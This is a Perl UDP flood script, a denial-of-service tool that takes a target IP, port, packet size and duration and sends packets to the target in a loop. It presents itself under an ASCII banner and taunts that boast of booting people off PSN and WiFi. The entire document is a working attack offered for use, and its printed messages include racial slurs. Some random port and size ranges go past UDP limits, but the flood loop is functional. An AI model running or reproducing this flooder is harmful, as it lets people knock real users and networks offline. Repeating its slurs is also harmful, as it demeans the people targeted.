#!/usr/bin/perl
 
##
# xXVANISHKILLERXx<----
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
 
         #     # ######  ####### ######  ######  ####### ######  
         #     # #     # #       #     # #     # #     # #     # 
         #     # #     # #       #     # #     # #     # #     # 
         #     # ######  #####   ######  ######  #     # ######  
         #     # #   #   #       #   #   #   #   #     # #   #   
         #     # #    #  #       #    #  #    #  #     # #    #  
          #####  #     # ####### #     # #     # ####### #     # 


Welcome to urError<3 - WhEn IN DoUbt KnoCk Em OuT, gEt SmAcKeD McDonald WiFi 
HAVIN ASS GET BOOTED BY PSN: urError
urError Coded By: urError
EOTEXT
 
print "~Doxem  NiX ShiT oN~ $ip " . ($port ? $port : "random") . "
ResPecT WiFi" .
  ($size ? "$size-byte" : "THIS ROUTER DONT WORK :(...O SHIT CALL 911 HIS MODEM ON FIRE!!") . "
~Doxem~ ~i'LL SlAp TiLL YoU CrY~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "GIVE THE SKID ANOTHER CHANCE TO LIVE MUST ASK urError FIRST NIGGA Ctrl-C TO STOP ATTACK NIGGER\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
